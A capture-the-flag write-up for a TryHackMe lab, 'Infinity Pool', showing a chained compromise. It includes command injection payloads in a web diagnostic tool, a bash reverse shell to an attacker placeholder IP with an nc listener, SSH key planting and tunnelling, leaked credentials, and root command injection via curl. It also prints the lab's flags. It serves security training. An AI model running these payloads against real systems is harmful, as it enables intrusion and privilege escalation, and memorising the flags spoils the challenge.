# Infinity Pool | Hacker Holidays Day 11 | TryHackMe Writeup

## Exploiting Command Injection and Internal Services to Escalate Privileges

**TryHackMe Room:** https://tryhackme.com/room/hh-infinitypool-5b3548af

Hacker Holidays 2026 is a 14-day, free cybersecurity event hosted by TryHackMe, designed to be accessible for beginners while providing a fun, story-driven experience.

Starting from July 27, a new beginner-friendly hacking challenge is released daily at 16:00 UTC. Set within the Byte Lotus Hotel, the event covers topics including OSINT, web exploitation, cloud security, digital forensics, and AI prompt attacks.

## Storyline: Day 11

### Concierge Briefing

> Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.

### Today's Objectives

- Find the user flag
- Find the root flag

---

## Walkthrough

I started with an Nmap scan to discover open ports and services running on the target.

```bash
nmap -Pn -sC -sV <TARGET_IP>
```

The initial scan revealed two open ports:

- **22/tcp** — OpenSSH
- **80/tcp** — Gunicorn web server

The scan also revealed a `robots.txt` file containing two disallowed entries:

- `/internal/`
- `/status`

I visited the target website and then checked:

```text
http://<TARGET_IP>/robots.txt
```

Although the paths were disallowed for crawlers, they were still accessible directly.

## Enumerating the Web Application

While inspecting the page source, I discovered an `app.js` file.

The JavaScript revealed that `/status` was a staff connectivity tool which sent requests to:

```text
/internal/netcheck
```

I accessed:

```text
http://<TARGET_IP>/status
```

The page contained a **Sister-property connectivity** tool with a form accepting a host or IP address.

Because the application appeared to use the supplied value for a network diagnostic command, I tested for command injection with:

```text
10.0.0.5; whoami
```

The response returned:

```text
web
```

This confirmed command injection and showed that the web application was executing commands as the `web` user.

## Obtaining a Shell

I used a Bash reverse-shell payload:

```bash
10.0.0.5; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

On the attack machine, I started a listener:

```bash
nc -lvnp 4444
```

I then supplied the payload through the vulnerable network diagnostic tool.

The connection returned to my listener, giving me shell access as `web`.

## Finding the User Flag

I searched the `/home/web` directory and located the user flag.

```text
THM{n0_v1s1bl3_3dg3}
```

---

# Privilege Escalation

I next checked common privilege-escalation vectors.

### SUID Files

```bash
find / -perm -4000 -type f 2>/dev/null
```

The output contained common SUID binaries such as `sudo`, `passwd`, `su`, and `mount`, but nothing unusual that immediately provided a privilege-escalation path.

I also checked SGID binaries:

```bash
find / -perm -2000 -type f 2>/dev/null
```

Again, nothing immediately useful stood out.

### Sudo Permissions

I checked the current user's sudo privileges:

```bash
sudo -l
```

The output indicated that authentication was required, and I did not have the `web` user's password.

The standard SUID, SGID, and sudo checks therefore did not provide a direct route to root.

---

# Enumerating Internal Services

I then examined the application's directory structure.

I was working inside:

```text
/var/www/infinity_pool/edge/
```

I listed the parent directory:

```bash
ls -la /var/www/infinity_pool/
```

Three directories stood out:

```text
edge
automation
watchtower
```

The `automation` directory was owned by `root`, while `watchtower` was owned by `svc-watch`.

I then checked the running processes:

```bash
ps aux | grep -E "automation|edge|watchtower"
```

This revealed:

- **edge** — running as `web`
- **watchtower** — running as `svc-watch` on port `3000`
- **automation** — running as `root` on port `9000`

The root-owned automation service was particularly interesting because it was bound only to localhost.

---

# Investigating Watchtower

I queried the watchtower service:

```bash
curl http://127.0.0.1:3000/
```

The response showed an HTML page titled:

```text
Watchtower — ops console
```

It listed the following endpoints:

```text
/api/health
/api/config
```

I queried the configuration endpoint:

```bash
curl http://127.0.0.1:3000/api/config
```

The response contained:

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

This exposed credentials for the internal FreePBX User Control Panel:

```text
Username: FreePBXUCPTemplateCreator
Password: St4yN0t1c3d_2026
```

It also revealed the internal UCP portal:

```text
http://127.0.0.1:8080/ucp
```

---

# Investigating the Root Automation Service

I queried its health endpoint:

```bash
curl http://127.0.0.1:9000/health
```

The response revealed:

```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {"report": "<report name>"},
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

The service exposed `POST /jobs/export`, required a Bearer token, and explicitly stated that it ran as root.

The remaining task was finding the automation key.

The watchtower configuration connected the automation service to the internal UCP portal, so I investigated UCP next.

---

# Accessing the Internal UCP Portal

The UCP portal was listening on localhost port `8080`, so it was not directly accessible from my attack machine.

I used SSH tunneling to forward the target's localhost port `8080` to my machine.

First, I generated a dedicated SSH key pair:

```bash
ssh-keygen -t rsa -f ~/.ssh/id_rsa_web -N ""
```

I then added the public key to the `web` user's authorized keys:

```bash
mkdir -p /home/web/.ssh
```

```bash
echo "<PUBLIC_KEY>" >> /home/web/.ssh/authorized_keys
```

```bash
chmod 600 /home/web/.ssh/authorized_keys
```

```bash
chmod 700 /home/web/.ssh
```

I then created the SSH tunnel:

```bash
ssh -i ~/.ssh/id_rsa_web -L 8080:127.0.0.1:8080 web@<TARGET_IP>
```

I could now access the internal UCP portal through:

```text
http://127.0.0.1:8080/ucp/
```

---

# Logging Into UCP

I used the credentials discovered in the watchtower configuration:

```text
Username: FreePBXUCPTemplateCreator
Password: St4yN0t1c3d_2026
```

The login succeeded and presented the UCP dashboard.

There were no active dashboards, so I created one named:

```text
demo
```

I then selected **Add Widget** and tested the available widgets.

After adding the **Voicemail** widget, it revealed:

```text
Automation key found: cc_auto_7b3f9a1c4e0d2f6a
```

This was the key required by the root automation service.

---

# Command Injection in the Root Automation Service

I first sent a legitimate request to understand the endpoint:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' -H 'Content-Type: application/json' --data-binary '{"report":"test"}'
```

I then tested whether the `report` parameter was vulnerable to command injection:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export   -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a'   -H 'Content-Type: application/json'   --data-binary '{"report":"test;whoami;#"}'
```

The response contained:

```text
root
```

This confirmed command injection in the root-owned automation service.

---

# Reading the Root Flag

I first listed the contents of `/root`:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export   -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a'   -H 'Content-Type: application/json'   --data-binary '{"report":"test;ls -la /root;#"}'
```

Among the files was:

```text
root.txt
```

I then read the file:

```bash
curl -sS -X POST http://127.0.0.1:9000/jobs/export   -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a'   -H 'Content-Type: application/json'   --data-binary '{"report":"test;cat /root/root.txt;#"}'
```

The root flag was:

```text
THM{tr4c3d_t0_th3_h0r1z0n}
```

---

# Flags

| Flag | Value |
|---|---|
| User Flag | `THM{n0_v1s1bl3_3dg3}` |
| Root Flag | `THM{tr4c3d_t0_th3_h0r1z0n}` |

---

# Attack Chain

```text
Nmap Enumeration
      ↓
robots.txt
      ↓
/status
      ↓
Command Injection
      ↓
Reverse Shell as web
      ↓
User Flag
      ↓
Internal Service Enumeration
      ↓
Watchtower :3000
      ↓
/api/config
      ↓
UCP Credentials
      ↓
SSH Port Forwarding
      ↓
Internal UCP :8080
      ↓
Voicemail Widget
      ↓
Automation Key
      ↓
Root Automation Service :9000
      ↓
Command Injection
      ↓
Root Command Execution
      ↓
Root Flag
```

## Conclusion

The challenge demonstrated how several weaknesses could be chained together.

The initial entry point was command injection in the public `/status` network diagnostic tool. This provided shell access as the `web` user and allowed the user flag to be recovered.

For privilege escalation, the key was internal service enumeration. The `watchtower` service exposed configuration information containing credentials for the internal UCP portal. SSH port forwarding made the localhost-only UCP portal accessible, where the Voicemail widget exposed the automation key.

Finally, the `/jobs/export` endpoint of the root-owned automation service was vulnerable to command injection through the `report` parameter. Because the service executed as root, this provided root-level command execution and allowed the final flag to be retrieved.

**Final flags:**

```text
User: THM{n0_v1s1bl3_3dg3}
Root: THM{tr4c3d_t0_th3_h0r1z0n}
```
